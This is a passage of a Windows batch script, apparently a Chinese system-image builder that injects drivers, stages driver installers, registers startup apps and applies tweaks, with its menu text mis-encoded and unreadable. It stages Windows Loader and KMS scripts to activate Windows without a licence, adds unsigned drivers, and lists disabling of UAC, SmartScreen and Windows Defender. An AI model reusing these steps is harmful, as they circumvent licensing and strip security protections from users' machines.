	"!Dism!" /image:"Mount" /add-package /packagepath:"File\NVME\x!Bit!\Hotfix"
	reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
	call :Log & call :Achiexe
) else (
	echo. && echo.���ص�ϵͳ��Windows!Version!_x!Bit!������Դ���밴���������... && pause>nul && goto :input4
)

:E3RAID
cls&title ����E3_RAID&set "Item=����E3_RAID"
if /i "!Version!"=="7" (
	taskkill /f /IM Dism++x64.exe >nul 2>nul
	taskkill /f /IM regedit.exe >nul 2>nul
	reg unload HKLM\ZTM >nul 2>nul
	"!Dism!" /image:"Mount" /add-driver /driver:"File\RAID\x!Bit!\E3_RAID" /Recurse
	reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
	call :Log & call :Achiexe
) else (
	echo. && echo.���ص�ϵͳ��Windows!Version!_x!Bit!������Դ���밴���������... && pause>nul && goto :input4
)

:KabyLakeRAID
cls&title ����KabyLake_RAID&set "Item=����KabyLake_RAID"
if /i "!Version!"=="7" (
	taskkill /f /IM Dism++x64.exe >nul 2>nul
	taskkill /f /IM regedit.exe >nul 2>nul
	reg unload HKLM\ZTM >nul 2>nul
	"!Dism!" /image:"Mount" /add-driver /driver:"File\RAID\x!Bit!\KabyLake_RAID" /Recurse
	reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
	call :Log & call :Achiexe
) else (
	echo. && echo.���ص�ϵͳ��Windows!Version!_x!Bit!������Դ���밴���������... && pause>nul && goto :input4
)

:DrvCeonw
cls&mode con cols=80 lines=30&title ���������ܲ������� 
set "AppPath="
set "Item="
echo.         
echo.    _____________________________ ���������ܲ� _____________________________
echo.   ^|                             --------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   ѡ��[1]:�������ܲ������汣����ӳ���ڣ�������ǰ�Զ���װ�����������״� ^|
echo.   ^|                                                                        ^|
echo.   ^|   ����������ٴε��ð�װ����������                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   ѡ��[2]:ϵͳ����ʱ���Զ�����C��֮������д��̸�Ŀ¼������ҵ���ϵͳ  ^|
echo.   ^|                                                                        ^|
echo.   ^|   ƥ��������ܲû��Զ���ѹ�����ã����ø�ʽ֧��.iso .zip .7z .rar��     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] �����ܲ�����                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] �����ܲ�����                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 3 goto :input4
if errorlevel 2 goto :DrvCeonwOut
if errorlevel 1 goto :DrvCeonwIn

:DrvCeonwIn
if /i "!Version:~0,1!"=="8" cls && echo. && echo.�ѹ��ص�ϵͳ�� Windows !Version! x!Bit!��û�д˰汾�������ܲá� && echo. && echo.�밴���������... && pause>nul && goto :input4
cls&set "Item=���������ܲ�-����"
set "DrvCeonw="
set "DrvCeonw=!ScriptsLog!\DrvCeonwIn.log"
set "AppPath=File\Driver\DrvCeonw.7z"
if exist "!AppPath!" (
	"!ToolsPath!\7z.exe" -y x "!AppPath!" "Win!Version!x!Bit!" "Res" "PESRS\DCWin!Version!x!Bit!" "DrvCeox!Bit!.exe" "uninstall.bat" "Drvceo.ini" -o"Mount\Windows\Driver\DrvCeonw" >nul 2>nul
	echo "%%WinDir%%\Driver\DrvCeonw\DrvCeox!bit!.exe" ^&^& goto :Next > "!DrvCeonw!"
	echo @echo off > "Mount\Windows\DrvCeo.cmd"
	echo rd /s /q "%%ProgramFiles%%\SysCeo" >> "Mount\Windows\DrvCeo.cmd"
	echo :ping >> "Mount\Windows\DrvCeo.cmd"
	echo ping -n 3 www.baidu.com^|findstr "TTL=" ^>nul 2^>nul^|^|ping -n 10 127.0.0.1^>nul^&^&goto :ping >> "Mount\Windows\DrvCeo.cmd"
	echo tasklist^|find /i "DrvCeox64.exe" ^>nul 2^>nul^|^|start "" "%%WinDir%%\Driver\DrvCeonw\DrvCeox!bit!.exe" -a >> "Mount\Windows\DrvCeo.cmd"
	echo del /f /q %%0 >> "Mount\Windows\DrvCeo.cmd"
) else (
	call :AppPath
)
if exist "Mount\Windows\Driver\DrvCeonw\DrvCeox!Bit!.exe" (
	if exist "!ScriptsLog!\DrvCeonwIn.log" ( call :Log & call :Achiexe ) else ( call :Failure )
) else (
	call :Failure
)

:DrvCeonwOut
if /i "!Version:~0,1!"=="8" ( cls && echo. && echo.�ѹ��ص�ϵͳ�� Windows !Version! x!Bit!��û�д˰汾�������ܲá� && echo. && echo.�밴���������... && pause>nul && goto :input4 )
cls&set "Item=���������ܲ�-����"
set "DrvCeonw="
set "DrvCeonw=!ScriptsLog!\DrvCeonwOut.log"
set "AppPath=File\Driver\DrvCeonw.7z"
if exist "!AppPath!" (
	"!ToolsPath!\7z.exe" -y x "!AppPath!" "Drvceo.ini" -o""!Scripts!"" >nul 2>nul
	echo FOR %%%%a in ^(D E F G H I J K L M N O P Q R S T U V W X Y Z^) do ^(FOR %%%%i in ^("%%%%a:\*.*"^) do ^(echo %%%%~xi^|findstr /i ".iso .zip .7z .rar" ^&^& 7z l "%%%%i" "DrvCeox!Bit!.exe"^|findstr /i "DrvCeox!Bit!.exe" ^&^& 7z -y x "%%%%i" -o"%%%%~dpni" ^&^& copy /v /y "%%~dp0Drvceo.ini" "%%%%~dpni" ^&^& "%%%%~dpni\DrvCeox!Bit!.exe" -d ^&^& call "%%ProgramFiles%%\SysCeo\DrvCeo\uninstall.bat" ^&^& rd /s /q "%%ProgramFiles%%\SysCeo" ^&^& goto :Next^)^) > "!DrvCeonw!"
) else (
	call :AppPath
)
if exist "!Scripts!\Drvceo.ini" (
	if exist "!ScriptsLog!\DrvCeonwOut.log" ( call :Log & call :Achiexe ) else ( call :Failure )
) else (
	call :Failure
)

:EasyDrv
cls&mode con cols=80 lines=30&title ������������
set "AppPath="
set "Item="
echo.
echo.    _____________________________ ������������ _____________________________
echo.   ^|                             --------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   ѡ��[1]:�����������ᱣ����ӳ���ڣ�������ӳ�������                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   ѡ��[2]:ϵͳ����ʱ���Զ�����C��֮������д��̸�Ŀ¼������ҵ���ϵͳ  ^|
echo.   ^|                                                                        ^|
echo.   ^|   ƥ���������������Զ���ѹ�����ã����ø�ʽ֧��.iso .zip .7z .rar��   ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] ������������                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] ������������                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 3 goto :input4
if errorlevel 2 goto :EasyDrvOut
if errorlevel 1 goto :EasyDrvIn

:EasyDrvIn
if /i "!Version:~0,1!"=="8" ( cls && echo. && echo.�ѹ��ص�ϵͳ�� Windows !Version! x!Bit!��û�д˰汾������������ && echo. && echo.�밴���������... && pause>nul && goto :input4 )
cls&set "Item=������������-����"
set "EasyDrv="
set "EasyDrv=!ScriptsLog!\EasyDrvIn.log"
set "AppPath=File\Driver\EasyDrv7_Win!Version!.x!Bit!*.*"

if exist "!AppPath!" (
	"!ToolsPath!\7z.exe" -y x "!AppPath!" -pitsk.com -o"Mount\Windows\Driver\EasyDrv7_Win!Version!.x!Bit!"
	echo "%%WinDir%%\Driver\EasyDrv7_Win!Version!.x!Bit!\EasyDrv7(Win!Version!.x!Bit!).exe" /a /c ^&^& reg delete "HKLM\SOFTWARE\EasyDrv7" /f ^&^& rd /s /q %%WinDir%%\Driver\EasyDrv7_Win!Version!.x!Bit! ^&^& goto :Next > "!EasyDrv!"
) else (
	cls&&echo.&&echo.���Ƚ�������Windows!Version! x!Bit!�������������뱾���ߵ�"File\Driver"�ļ����ڡ�&&echo.&&echo.�ļ������������һ�£���ʽ֧��.ISO.7Z.ZIP.RAR��&&echo.&&echo.�밴���������...&&pause>nul&&goto :EasyDrv
)
if exist "Mount\Windows\Driver\EasyDrv7_Win!Version!.x!Bit!\EasyDrv7(Win!Version!.x!Bit!).exe" (
	if exist "!EasyDrv!" ( call :Log & call :Achiexe ) else ( call :Failure )
) else (
	call :Failure
)

:EasyDrvOut
if /i "!Version:~0,1!"=="8" ( cls && echo. && echo.�ѹ��ص�ϵͳ�� Windows !Version! x!Bit!��û�д˰汾������������ && echo. && echo.�밴���������... && pause>nul && goto :input4 )
cls&set "Item=������������-����"
set "EasyDrv="
set "EasyDrv=!ScriptsLog!\EasyDrvOut.log"
echo FOR %%%%a in ^(D E F G H I J K L M N O P Q R S T U V W X Y Z^) do ^(FOR %%%%i in ^("%%%%a:\*.*"^) do ^(echo %%%%~xi^|findstr /i ".iso .zip .7z .rar" ^&^& 7z l "%%%%i" "EasyDrv7(Win!Version!.x!Bit!).exe"^|findstr /i "EasyDrv7(Win!Version!.x!Bit!).exe" ^&^& 7z -y x "%%%%i" -o"%%%%~dpni" ^&^& "%%%%~dpni\EasyDrv7(Win!Version!.x!Bit!).exe" /a /c ^&^& reg delete "HKLM\SOFTWARE\EasyDrv7" /f ^&^& goto :Next^)^) > "!EasyDrv!"
if exist "!EasyDrv!" ( call :Log & call :Achiexe ) else ( call :Failure )

:AppleDrive
cls&mode con cols=80 lines=30&title ����ƻ������
set "AppPath="
set "Item=����ƻ������"
set "goto=input4"
echo.
echo.    _____________________________ ����ƻ������ _____________________________
echo.   ^|                             --------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��ѡ���������ȫϵ��ƻ�����Թؼ��������������������ذ壬���̵�...    ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] ����ƻ������                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:1X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 2 goto :input4
if not exist "File\AppleDrive\Win!Version!" cls&&echo.&&echo.û�д˰汾��ƻ�������������Windows7��windows10���밴���������...&&pause>nul&&goto :input4
cls&&echo.&&echo.��������ƻ�������У����Ե�...
taskkill /f /IM Dism++x64.exe >nul 2>nul
taskkill /f /IM regedit.exe >nul 2>nul
reg unload HKLM\ZTM >nul 2>nul
"!Dism!" /image:"Mount" /add-driver /driver:"File\AppleDrive\Win!Version!" /Recurse /ForceUnsigned
reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
call :Log & call :Achiexe

:input5
cls&mode con cols=80 lines=30&title �����Զ�����
set "AppPath="
set "Item=�����Զ�����"
set "goto=menu3"
echo.
echo.    _____________________________ �����Զ����� _____________________________
echo.   ^|                             --------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   Windows_7 ����MBR�������ü��GPT�������ֶ����                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   Windows_8 ΪKMS������꣬�Զ����ڡ�                                  ^|
echo.   ^|                                                                        ^|
echo.   ^|   Windows10 ���ü����½΢���΢������ɲ�ѯ��Ȩ�豸��               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] ����Զ�����                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:1X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 2 goto :menu3
if errorlevel 1 goto :activation

:activation
cls&set "Copy="&set "activation="
if /i "!Version!"=="7" (
	set "AppPath=File\activation\activation.7z"
	set "Copy="!ToolsPath!\7z.exe" -y x "!AppPath!" "Windows_Loader_2.2.2_Final.7z" -o"!Scripts!""
	set "activation=7z -y x "%%~dp0Windows_Loader_2.2.2_Final.7z" -o"%%~dp0"&&"%%~dp0WindowsLoader.exe" /silent /preactivate"
)
if /i "!Version!"=="10" (
	set "AppPath=File\activation\activation.7z"
	set "Copy="!ToolsPath!\7z.exe" -y x "!AppPath!" "activation_x!Bit!" -o"!Scripts!""
	set "activation=call %%~dp0activation_x!Bit!\activation.cmd"
)
if  /i "!Version:~0,1!"=="8" (
	set "AppPath=File\activation\activation.7z"
	set "Copy="!ToolsPath!\7z.exe" -y x "!AppPath!" "bin" "OOBE.cmd" -o"!Scripts!""
	set "activation=::"
)
if exist "!AppPath!" (
	!Copy! >nul 2>nul
	echo !activation! > "!ScriptsLog!\activation.log"
) else (
	call :AppPath
)
if exist "!AppPath!" (
	if exist "!ScriptsLog!\activation.log" ( call :Log & call :Achiexe ) else ( call :Failure )
) else (
	call :Failure
)

:input6
cls&mode con cols=80 lines=30&title �����Զ���������Ӧ�ó���
set "Item="
set "goto="
if not exist "[App]" md "[App]" >nul 2>nul
echo.
echo.    _________________________ �Զ���������Ӧ�ó��� _________________________
echo.   ^|                         ----------------------                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   ֧��.exe .cmd .bat .vbs�ļ���֧�����в�����                          ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���Ƚ�Ҫ���е��ļ����ļ��з��뱾���ߵ�[App]�ļ����ڡ�                ^|
echo.   ^|                                                                        ^|
echo.   ^|   Ȼ���������괦����"������|����",��������·��,��ο����е����ӡ�    ^|
echo.   ^|                                                                        ^|
echo.   ^|   �޲���:QQ.exe �в���:QQ.exe^|/S�����в���������ǰ��^|���Ǳ�Ҫ�ģ���    ^|
echo.   ^|                                                                        ^|
echo.   ^|   ����ĳ��������������[App]�ļ����ڶ�Ӧ��������һ�£�                ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���践�������� X Ȼ��س���                                          ^|
echo.   ^|                                                                        ^|
echo.
set "SourceApp="
set /p SourceApp=^>^>^>^>^>^>^>�����룺
if not defined SourceApp cls && echo. && echo.��������Ϊ�գ��밴�����������������... && pause>nul && goto :input6
set "SourceApp=!SourceApp:"=!"
if not defined SourceApp cls && echo. && echo.���������ʽ����ȷ�����밴�����������������... && pause>nul && goto :input6
if /i "!SourceApp!" equ "x" goto :menu3
set "AppName="
set "AppParameter="
set "SourceAppPath="
set "SourceAppFolder="
set "Copy="
for /f "tokens=1,2 delims=|" %%a in ("!SourceApp!") do (set "AppName=%%a"&set "AppParameter=%%b")
echo .exe.cmd.vbs.bat|find /i "!AppName:~-4!" >nul 2>nul||(cls&&echo.&&echo.��������"!SourceApp!"���Ǻϸ���ļ����ƣ��밴�����������������...&&pause>nul&&goto :input6)
echo .exe.cmd.vbs.bat|find /i "!AppName!" >nul 2>nul&&(cls&&echo.&&echo.��������"!SourceApp!"���Ǻϸ���ļ����ƣ��밴�����������������...&&pause>nul&&goto :input6)
for /f %%i in ('dir /a-d /b /s "[App]\!AppName!"') do (set "SourceAppPath=%%~dpi"&set "AppName=%%~nxi")
if not exist "!SourceAppPath!!AppName!" cls&&echo.&&echo.�����ߵ�[App]�ļ�����δ����"!AppName!"�ļ����ļ��С�&&echo.&&echo.����Ҫ�Ȱ�"!AppName!"�ļ����ļ��з���[App]�ļ����ڡ�&&echo.&&echo.�밴���������...&&start "" explorer.exe "[App]"&&pause>nul&&goto :input6 )
if not defined AppParameter (set "AppParameter=") else (set "AppParameter= !AppParameter!")
for /f "tokens=2 delims=[" %%a in ("!SourceAppPath!") do set "SourceAppPath=[%%a"
if /i "!SourceAppPath!" equ "[App]\" (
	set "SourceAppPath="&set "Copy=copy /v /y "[App]\!AppName!"" 
) else (
	for /f "tokens=2 delims=\" %%a in ("!SourceAppPath!") do set "Copy="!ToolsPath!\PECMD.EXE" FILE "[App]\%%a\"=^>"
	set "SourceAppPath=!SourceAppPath:[App]\=!"
)

:AppSet
cls&mode con cols=80 lines=30&title !AppName!����
set "goto=input6"
set "TargetAppPath="
set "Run="
set "FilePath="
echo.
echo.    ____________________________ ������������ ______________________________
echo.   ^|                            --------------                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���û�л�ȷ������ľ�Ĭ�����Ƿ���ȷ����ѡ�״ν������ִ�У�����   ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��������Զ�����װ��ͣ�������װ���档                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] �״ν�����ǰ���У�ֻ����һ�Σ��������Զ������                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] �״ν���������У�ֻ����һ�Σ��������Զ������                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] ÿ�ν���������У�ÿ�����������С�                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:123X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 4 goto :input6
if errorlevel 3 goto :AppAfter
if errorlevel 2 goto :AppAfterOnce
if errorlevel 1 goto :AppBefore
:AppBefore
set "Item=�����״ν�����ǰ����"!AppName!!AppParameter!""
set "TargetAppPath=!Scripts!"
set "Run="
goto :AppNext
:AppAfterOnce
set "Item=�����״ν����������"!AppName!!AppParameter!"��ֻ����һ��"
set "TargetAppPath=!Sysprep!"
set "Run=RunOnce"
set "FilePath=Sysprep"
goto :AppNext
:Appafter
set "Item=���Ͻ����������"!AppName!!AppParameter!"��ÿ������������"
set "TargetAppPath=Mount\Windows\RunApp"
set "Run=Run"
set "FilePath=RunApp"
if not exist "!TargetAppPath!" md "!TargetAppPath!" >nul 2>nul
:AppNext
cls
!Copy! "!TargetAppPath!\" >nul 2>nul
if "!Run!" equ "" (
	if not exist "!ScriptsLog!\App" md "!ScriptsLog!\App" >nul 2>nul
	echo "!ScriptsPath!\!SourceAppPath!!AppName!"!AppParameter!>"!ScriptsLog!\APP\!AppName:~0,-4!.log"
) else (
	echo reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\!Run!" /v "!AppName:~0,10!" /t REG_SZ /d "\"!windir!\!FilePath!\!SourceAppPath!!AppName!\"!AppParameter!" /f>>"!ScriptsLog!\AppAfter.log"
)
if exist "!TargetAppPath!\!SourceAppPath!!AppName!" ( call :Log & call :Achiexe ) else ( call :Failure )

:input7
cls&mode con cols=80 lines=44&title �Ż�ϵͳ
set "AppPath="
set "Item=�Ż�Windows!Version!_x!Bit!"
set "goto=menu3"
echo.
echo.    _______________________________ �Ż�ϵͳ _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   ***����ͼ�꣬���������Լ���ʼ�˵��Ż�***                             ^|
if /i "!Version!"=="7" (
echo.   ^|                                                                        ^|
echo.   ^|   ��������ʾ�����                                                     ^|
)
if /i "!Version!"=="10" (
echo.   ^|                                                                        ^|
echo.   ^|   ��������ʾ�˵���                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��������ʾ�������                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���������е�Cortana����Ϊ����ʾͼ��                                  ^|
echo.   ^|                                                                        ^|
echo.   ^|   ������ʱ�Ӿ�ȷ����                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   �Ƴ����������䰴ť                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��ʾ��ʼ�˵������������������ĺͱ���������ɫ                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   ʹ��ʼ�˵�������������������͸��                                     ^|
)
if  /i "!Version:~0,1!"=="8" (
echo.   ^|                                                                        ^|
echo.   ^|   ��������ʾ�˵���                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��������ʾ�������                                                   ^|
)
echo.   ^|                                                                        ^|
echo.   ^|   ����������ռ��ʱʼ�պϲ�                                             ^|
if /i "!Version!"=="10" (
echo.   ^|                                                                        ^|
echo.   ^|   �����������ϵ�������ť                                               ^|
)
echo.   ^|                                                                        ^|
echo.   ^|   ���������ص�������                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   ȡ���������ϵİ�����ť                                               ^|
if /i "!Version!"=="7" (
echo.   ^|                                                                        ^|
echo.   ^|   ����Win7 Aero����                                                    ^|
echo.   ^|                                                                        ^|
echo.   ^|   ����DWM�е�͸����                                                    ^|
echo.   ^|                                                                        ^|
echo.   ^|   �رտ�ʼ�˵�"ͻ����ʾ�°�װ�ĳ���"                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��ʼ�˵���ʾ����                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   ȡ����Ϸ��"�����й��Ѱ�װ��Ϸ�ļ��ɺ���Ϣ"��"�ռ�����������Ϸ��Ϣ" ^|
echo.   ^|                                                                        ^|
echo.   ^|   ***��Դ�������Ż�***                                                 ^|
)
if /i "!Version!"=="10" (
echo.   ^|                                                                        ^|
echo.   ^|   �������ڿ�ʼ�˵���ʾ����                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ر���Ӧ���̵��в��ҹ���Ӧ��                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ر�ż���ڿ�ʼ�˵�����ʾ���Ƽ�Ӧ��                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ر�Windows Ink�ƹ�Ӧ��                                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ر�����ʱ��Windows �۽��ƹ�                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ر�"ʹ��Windowsʱ��ȡ���ɺͽ���"                                    ^|
if /i "!Version!"=="10" echo. && echo. && echo.       ���������"Windows!Version!_x!Bit!"���Ż���Ŀ���밴���������... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   �ر�"ͻ����ʾ�°�װ�ĳ���"                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��ֹ�Զ���װ�Ƽ���Ӧ�ó���                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ر���Ϸ¼�ƹ���                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ر�"��������Ϸʱ�ں�̨¼��"�������˹��ܻ�Ӱ����Ϸ����               ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��½����Ĭ�ϴ�С����                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ر�OneDrive                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ر��Զ����µ�ͼ                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��ʾ�״ε�¼����                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   ***��Դ�������Ż�***                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   ����Դ������ʱ��ʾ�˵���                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���ش˵�������Ƶ��ͼƬ���ĵ������ء����֡����桢3D�����߸��ļ���     ^|
)
if  /i "!Version:~0,1!"=="8" (
echo.   ^|                                                                        ^|
echo.   ^|   �ر���Ӧ���̵��в��ҹ���Ӧ��                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   �رա�ͻ����ʾ�°�װ�ĳ���                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��½����Ĭ�ϴ�С����                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��ʾ�״ε�¼����                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   ***��Դ�������Ż�***                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   ����Դ������ʱ��ʾ�˵���                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���ش˵�������Ƶ��ͼƬ���ĵ������ء����֡����������ļ���             ^|
)
echo.   ^|                                                                        ^|
echo.   ^|   ��ʾ�����ļ���չ��                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���ؿ�ݷ�ʽС��ͷ                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���ؿ�ִ���ļ�С����                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   ����NTFS��ɫ˫��ͷѹ����ʶ                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   ������ݷ�ʽʱ�����ݷ�ʽ����                                       ^|
if  /i "!Version:~0,1!"=="8" echo. && echo. && echo.       ���������"Windows!Version!_x!Bit!"���Ż���Ŀ���밴���������... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   ��ֹ�Զ�����                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ڵ����Ľ����д��ļ��д���                                         ^|
if /i "!Version!"=="7" echo. && echo. && echo.       ���������"Windows!Version!_x!Bit!"���Ż���Ŀ���밴���������... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   ��Դ������������С��ʱ��ʾ����·��                                   ^|
if /i "!Version!"=="10" echo. && echo. && echo.       ���������"Windows!Version!_x!Bit!"���Ż���Ŀ���밴���������... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   �ر���Ƶ�ļ�Ԥ���������Դ��������Ӧ�ٶ�                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ر������ļ�ͼƬԤ���������Դ��������Ӧ�ٶ�                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��Դ���������ٷ��ʲ���ʾ�����ļ���                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��Դ���������ٷ��ʲ���ʾ���ʹ�õ��ļ�                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   ***��ȫ�����Ż�***                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���û��˺ſ��Ƴ���UAC������Ϊ�Ӳ�֪ͨ                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   �����������ù���Ա�ʻ��Ĺ���Ա��׼ģʽ                               ^|
if /i "!Version!"=="10" (
echo.   ^|                                                                        ^|
echo.   ^|   �ر�SmartscreenӦ��ɸѡ��                                            ^|
)
echo.   ^|                                                                        ^|
echo.   ^|   �رմ򿪳���İ�ȫ����                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   ����Windows Defender                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   ***������Ż�***                                                     ^|
if /i "!Version!"=="10" (
echo.   ^|                                                                        ^|
echo.   ^|   Edge�����,��ֹMicrosoft Edge"�״�����"��ӭҳ��                      ^|
echo.   ^|                                                                        ^|
echo.   ^|   Edge�����,�ر�Adobe Flash���㼴��                                   ^|
)
echo.   ^|                                                                        ^|
echo.   ^|   IE�����,�رն��ѡ�ʱ����������                                  ^|
echo.   ^|                                                                        ^|
echo.   ^|   IE�����,��������ѡ�ʱ��ʼ���л�����ѡ�                        ^|
echo.   ^|                                                                        ^|
echo.   ^|   IE�����,��������ӵ�ǰ���ڵ���ѡ�������                        ^|
echo.   ^|                                                                        ^|
echo.   ^|   IE�����,�Լ�������ͼ����ʾ������վ                                  ^|
echo.   ^|                                                                        ^|
echo.   ^|   IE�����,���ñ����Զ���ɹ���                                      ^|
echo.   ^|                                                                        ^|
echo.   ^|   IE�����,�رս������վ                                              ^|
if  /i "!Version:~0,1!"=="8" echo. && echo. && echo.       ���������"Windows!Version!_x!Bit!"���Ż���Ŀ���밴���������... && pause>nul && cls
if /i "!Version!"=="10" echo. && echo. && echo.       ���������"Windows!Version!_x!Bit!"���Ż���Ŀ���밴���������... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   IE�����,����IE�״������Զ�������                                    ^|
echo.   ^|                                                                        ^|
echo.   ^|   IE�����,�����渽����������Ϣ                                        ^|
if /i "!Version!"=="7" echo. && echo. && echo.       ���������"Windows!Version!_x!Bit!"���Ż���Ŀ���밴���������... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   IE�����,����Internet Explorer��ǿ����ģʽ                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   IE�����,�����ǿ����ģʽ����64λ����                                ^|
echo.   ^|                                                                        ^|
echo.   ^|   IE�����,����Internet Explorer������                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   IE�����,��ͬʱ����������Ŀ������ 10                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   IE�����,������������ʱʼ������ѡ��д򿪵�������                  ^|
echo.   ^|                                                                        ^|
echo.   ^|   IE�����,�ر�IE�Զ�����                                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   ***�����Ż�***                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   �رճ������������                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���ô��󱨸�                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���ü�ͥ��                                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���ÿͻ�������Ƽƻ�                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   ***ϵͳ�����Ż�***                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   �Ż�Ӳ�����ݴ洢 -                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ӿ�Aero Snap��ʾ�ٶȣ�����Ŀ�����������ͼ                          ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ӿ�Aero Peek͸�����湦�ܵ���ʾ�ٶ�                                  ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���ǰ̨�������Ӧ�ٶ�                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ӿ�ϵͳ���ڴ��������ʾ��Ӧ�ٶ�                                     ^|
if  /i "!Version:~0,1!"=="8" echo. && echo. && echo.       ���������"Windows!Version!_x!Bit!"���Ż���Ŀ���밴���������... && pause>nul && cls
if /i "!Version!"=="10" echo. && echo. && echo.       ���������"Windows!Version!_x!Bit!"���Ż���Ŀ���밴���������... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   �Ż�����ķ�Ӧʱ�䣬�ӿ�ϵͳ�����ٶȡ�                               ^|
echo.   ^|                                                                        ^|
